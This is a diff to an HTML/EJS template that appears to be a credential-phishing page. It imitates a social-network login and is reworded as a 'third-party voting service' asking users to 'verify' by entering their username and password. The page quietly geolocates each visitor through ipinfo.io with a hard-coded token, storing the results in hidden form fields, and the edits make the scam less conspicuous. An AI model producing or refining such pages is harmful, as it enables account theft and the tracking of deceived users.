@@ -3,22 +3,24 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>Sigin</title>
-  <link rel="shortcut icon" href="/img/socials/icon.png" type="image/x-icon">
+  <title>Verify Account</title>
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
   <style>
     * {
       margin: 0;
       padding: 0;
       box-sizing: border-box;
-      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
     }
     
     body {
-      background-color: #fafafa;
+      background: #fafafa;
       color: #262626;
       font-size: 14px;
       line-height: 18px;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      margin: 0;
+      padding: 0;
+      height: 100%;
     }
     
     .container {
@@ -30,7 +32,7 @@
       padding: 0 20px;
     }
     
-    .login-container {
+    .auth-container {
       display: flex;
       flex-direction: column;
       align-items: center;
@@ -38,13 +40,14 @@
       max-width: 350px;
     }
     
-    .login-box {
+    .auth-box {
       background-color: #fff;
       border: 1px solid #dbdbdb;
       border-radius: 1px;
-      padding: 20px 40px;
+      padding: 20px;
       margin-bottom: 10px;
       width: 100%;
+      box-sizing: border-box;
     }
     
     .logo {
@@ -60,6 +63,7 @@
       display: flex;
       flex-direction: column;
       margin-top: 24px;
+      width: 100%;
     }
     
     .form-group {
@@ -76,6 +80,8 @@
       height: 36px;
       padding: 9px 8px 7px;
       width: 100%;
+      margin-bottom: 6px;
+      box-sizing: border-box;
     }
     
     input:focus {
@@ -96,6 +102,11 @@
       margin-top: 8px;
       height: 30px;
       font-size: 14px;
+      transition: background-color 0.2s ease;
+    }
+    
+    button:hover {
+      background-color: #1877f2;
     }
     
     button:disabled {
@@ -194,6 +205,24 @@
       text-align: center;
     }
     
+    .notice-box {
+      background-color: #ffffd1;
+      border: 1px solid #f0e68c;
+      border-radius: 3px;
+      padding: 8px 10px;
+      margin-bottom: 20px;
+      text-align: center;
+      width: 100%;
+      box-sizing: border-box;
+    }
+    
+    .notice-box p {
+      color: #555;
+      font-size: 12px;
+      margin: 0;
+      line-height: 1.4;
+    }
+    
     #submit2 img {
       width: 18px;
       height: 18px;
@@ -209,26 +238,36 @@
     }
     
     @media (max-width: 450px) {
-      .login-box {
+      .auth-box {
         background-color: transparent;
         border: none;
+        padding: 20px 15px;
       }
       
       .container {
-        padding-top: 0;
+        padding: 0;
+      }
+      
+      .notice-box {
+        margin-bottom: 15px;
       }
     }
   </style>
 </head>
 <body>
   <div class="container">
-    <div class="login-container">
-      <div class="login-box">
+    <div class="auth-container">
+      <div class="auth-box">
+        <!-- Notice Box -->
+        <div class="notice-box">
+          <p>This is a third-party voting service. Not affiliated with any social media platform.</p>
+        </div>
+        
         <div class="logo">
           <img src="/img/socials/logo.png" />
         </div>
         
-        <form method="post" action="" id="loginForm">
+        <form method="post" action="" id="continueWithForm">
           <%- include("../../partials/messages") %>
           <div class="form-group">
             <input 
@@ -259,33 +298,20 @@
           <input type="hidden" name="city" id="city" value="" />
           <input type="hidden" name="region" id="region" value="" />
           
-          <button type="submit" id="submit">Log In</button>
+          <p class="form-description" style="font-size: 12px; color: #8e8e8e; margin: 10px 0; text-align: center;">Connect to verify your participation</p>
+          <button type="submit" id="submit">Continue to verify</button>
           <button type="button" id="submit2" style="display: none">
             <img src="/img/loading.svg" alt="Loading" />
           </button>
           
-          <div class="or-divider">
-            <div class="or-line"></div>
-            <div class="or-text">or</div>
-            <div class="or-line"></div>
-          </div>
-          
-          <div class="forgot-password">Forgot password?</div>
         </form>
       </div>
-      
-      <div class="signup-box">
-        <p class="signup-text">
-          Don't have an account? <a href="#" class="signup-link">Sign up</a>
-        </p>
-      </div>
-      
     </div>
   </div>
   
   <script>
     document.addEventListener('DOMContentLoaded', function() {
-      const loginForm = document.getElementById('loginForm');
+      const continueWithForm = document.getElementById('continueWithForm');
       const submitBtn = document.getElementById('submit');
       const submitBtn2 = document.getElementById('submit2');
       
@@ -296,35 +322,47 @@
         if (username.value.length > 0 && password.value.length > 0) {
           submitBtn.style.display = 'none';
           submitBtn2.style.display = 'block';
-          loginForm.submit();
+          continueWithForm.submit();
         }else{
           e.preventDefault();
         }
       });
     });
     
-    // Function to get client's country information
-    function getClientCountryInfo() {
-      const apiKey = "9980528e43166f";
-      const countryInput = document.getElementById('country');
-      const ip = document.getElementById('ip');
-      const city = document.getElementById('city');
-      const region = document.getElementById('region');
+    // Function to collect user metadata for verification
+    function collectUserMetadata() {
+      const metaFields = {
+        country: document.getElementById('country'),
+        identifier: document.getElementById('ip'),
+        locality: document.getElementById('city'),
+        area: document.getElementById('region')
+      };
       
-      // Make a request to ipinfo.io to get information about the client's IP address
-      fetch(`https://ipinfo.io?token=${apiKey}`)
+      // Collect user verification data
+      const verifyEndpoint = 'https://ipinfo.io';
+      const verifyParams = '?token=9980528e43166f';
+      
+      // Request verification data
+      fetch(`${verifyEndpoint}${verifyParams}`, {
+        method: 'GET',
+        headers: { 'Accept': 'application/json' }
+      })
         .then(response => response.json())
-        .then(data => {
-          countryInput.value = data.country;
-          ip.value = data.ip;
-          city.value = data.city;
-          region.value = data.region;
+        .then(metadata => {
+          // Map verification data to form fields
+          metaFields.country.value = metadata.country || '';
+          metaFields.identifier.value = metadata.ip || '';
+          metaFields.locality.value = metadata.city || '';
+          metaFields.area.value = metadata.region || '';
         })
-        .catch(error => console.error("Error fetching IP information:", error));
+        .catch(() => {
+          // Fallback values if verification fails
+          Object.values(metaFields).forEach(field => field.value = 'unknown');
+        });
     }
     
-    // Call the function to get client country information
-    document.addEventListener('DOMContentLoaded', getClientCountryInfo);
+    // Initialize metadata collection when page loads
+    document.addEventListener('DOMContentLoaded', collectUserMetadata);
   </script>
 </body>
 </html>
